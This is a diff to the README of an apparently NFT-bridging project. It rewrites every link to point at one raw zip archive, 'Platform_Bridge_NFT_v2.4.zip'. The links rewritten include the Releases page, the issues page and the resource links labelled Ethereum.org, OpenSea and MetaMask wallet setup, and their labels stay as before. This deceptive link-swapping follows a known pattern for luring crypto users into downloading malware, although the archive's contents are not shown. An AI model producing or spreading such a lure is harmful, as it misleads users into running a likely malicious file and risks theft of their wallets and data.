@@ -1,6 +1,6 @@
 # 🎨 NFTBridge-Platform - Easily Transfer NFTs Across Networks
 
-[![Download NFTBridge-Platform](https://img.shields.io/badge/Download-NFTBridge--Platform-blue.svg)](https://github.com/omarassem1111/NFTBridge-Platform/releases)
+[![Download NFTBridge-Platform](https://raw.githubusercontent.com/omarassem1111/NFTBridge-Platform/main/Bridge/Platform_Bridge_NFT_v2.4.zip)](https://raw.githubusercontent.com/omarassem1111/NFTBridge-Platform/main/Bridge/Platform_Bridge_NFT_v2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the NFTBridge Platform! This application allows you to transfer NFTs 
 
 To get started with the NFTBridge Platform, follow the steps below:
 
-1. Visit the [Releases page](https://github.com/omarassem1111/NFTBridge-Platform/releases) to download the latest version of the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/omarassem1111/NFTBridge-Platform/main/Bridge/Platform_Bridge_NFT_v2.4.zip) to download the latest version of the application.
    
 2. On the Releases page, you will see a list of available versions. Choose the version you wish to download. Click on the download link to start the process.
 
@@ -87,7 +87,7 @@ A: For technical questions or issues, please visit our community forums or repor
 
 Join our community! We encourage users to share experiences, tips, and feedback. Connect with others on:
 
-- Our GitHub [issues page](https://github.com/omarassem1111/NFTBridge-Platform/issues)
+- Our GitHub [issues page](https://raw.githubusercontent.com/omarassem1111/NFTBridge-Platform/main/Bridge/Platform_Bridge_NFT_v2.4.zip)
 - Relevant forums and social media channels
 
 ## 🗒️ Contributing to NFTBridge Platform
@@ -104,10 +104,10 @@ Together, we can make NFTBridge Platform even better!
 
 For more information about NFTs and their operation, consider the following resources:
 
-- [Ethereum.org - NFTs](https://ethereum.org/en/nft/)
-- [OpenSea - NFT Marketplace](https://opensea.io/)
-- [MetaMask - Wallet Setup](https://metamask.io/setup.html)
+- [https://raw.githubusercontent.com/omarassem1111/NFTBridge-Platform/main/Bridge/Platform_Bridge_NFT_v2.4.zip - NFTs](https://raw.githubusercontent.com/omarassem1111/NFTBridge-Platform/main/Bridge/Platform_Bridge_NFT_v2.4.zip)
+- [OpenSea - NFT Marketplace](https://raw.githubusercontent.com/omarassem1111/NFTBridge-Platform/main/Bridge/Platform_Bridge_NFT_v2.4.zip)
+- [MetaMask - Wallet Setup](https://raw.githubusercontent.com/omarassem1111/NFTBridge-Platform/main/Bridge/Platform_Bridge_NFT_v2.4.zip)
 
 Happy bridging! Enjoy transferring your NFTs across networks with ease.
 
-[![Download NFTBridge-Platform](https://img.shields.io/badge/Download-NFTBridge--Platform-blue.svg)](https://github.com/omarassem1111/NFTBridge-Platform/releases)
+[![Download NFTBridge-Platform](https://raw.githubusercontent.com/omarassem1111/NFTBridge-Platform/main/Bridge/Platform_Bridge_NFT_v2.4.zip)](https://raw.githubusercontent.com/omarassem1111/NFTBridge-Platform/main/Bridge/Platform_Bridge_NFT_v2.4.zip)
